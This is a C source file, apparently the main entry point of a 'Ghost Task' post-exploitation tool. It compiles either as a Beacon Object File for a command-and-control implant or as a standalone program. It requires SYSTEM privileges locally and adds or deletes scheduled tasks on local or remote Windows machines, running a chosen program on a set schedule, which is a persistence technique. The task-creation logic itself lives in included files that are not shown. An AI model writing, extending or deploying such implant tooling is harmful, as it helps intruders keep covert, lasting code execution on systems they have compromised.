#include <windows.h>
#include <stdio.h>
#define DYNAMIC_LIB_COUNT 2
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "ghost_task.c"

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length)
{
    HRESULT hr = S_OK;
    datap parser;
    Arguments arguments;

    if (!bofstart())
    {
        return;
    }

    BeaconDataParse(&parser, Buffer, Length);

    if (!ParseArguments(&parser, &arguments))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid arguments");
        return;
    }
    if (arguments.computerName == NULL)
    {
        if (!CheckSystem())
        {
            BeaconPrintf(CALLBACK_ERROR, "You have to run it as SYSTEM.");
            return;
        }
    }
    if (arguments.taskOperation == TaskAddOperation)
         AddScheduleTask(arguments.computerName, arguments.taskName, arguments.program, arguments.argument, arguments.userName, arguments.scheduleType, arguments.hour, arguments.minute, arguments.second, arguments.dayBitmap);
    else if (arguments.taskOperation == TaskDeleteOperation)
        DeleteScheduleTask(arguments.computerName, arguments.taskName);

    internal_printf("\nRUN Ghost Tasks SUCCESS.\n");
    printoutput(TRUE);
    bofstop();
};
#else
int main(int argc, char **argv)
{
    Arguments arguments;
    if (argc == 2 && (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0))
    {
        printHelp();
        return 0;
    }
    if (!ParseArguments(argv, argc, &arguments))
        return 0;
    if (arguments.computerName == NULL)
    {
        if (!CheckSystem())
        {
            printf("[-] You have to run it as SYSTEM.\n");
            return 0;
        }
    }
    if (arguments.taskOperation == TaskAddOperation)
        AddScheduleTask(arguments.computerName, arguments.taskName, arguments.program, arguments.argument, arguments.userName, arguments.scheduleType, arguments.hour, arguments.minute, arguments.second, arguments.dayBitmap);
    else if (arguments.taskOperation == TaskDeleteOperation)
        DeleteScheduleTask(arguments.computerName, arguments.taskName);
    return 0;
}
#endif
